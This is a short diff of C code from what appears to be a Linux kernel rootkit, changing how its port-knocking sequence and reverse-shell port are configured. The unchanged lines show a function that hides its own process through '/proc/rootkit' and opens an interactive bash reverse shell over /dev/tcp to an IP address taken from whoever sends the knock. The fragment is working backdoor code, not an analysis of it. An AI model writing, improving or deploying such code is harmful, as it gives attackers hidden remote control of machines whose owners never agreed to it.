@@ -1,8 +1,6 @@
 #include "port_knocking.h"
 
-#define KNOCK_LENGTH 3
-
-static int knocking_ports[KNOCK_LENGTH] = {5295, 9257, 7369};
+static int knocking_ports[KNOCK_LENGTH] = KNOCK_PORTS;
 
 struct knocker
 {
@@ -36,7 +34,7 @@ static void exec_command(struct work_struct *w)
 void exec_reverse_shell(u32 ip_addr)
 {    
     sprintf(bash_command, "echo hide$$ > /proc/rootkit && bash -i >& /dev/tcp/%d.%d.%d.%d/%d 0>&1", 
-            (u8)ip_addr >> 0, (u8)(ip_addr >> 8), (u8)(ip_addr >> 16), (u8)(ip_addr >> 24), LPORT);
+            (u8)ip_addr >> 0, (u8)(ip_addr >> 8), (u8)(ip_addr >> 16), (u8)(ip_addr >> 24), RPORT);
 
     schedule_work(&exec_work);
 }
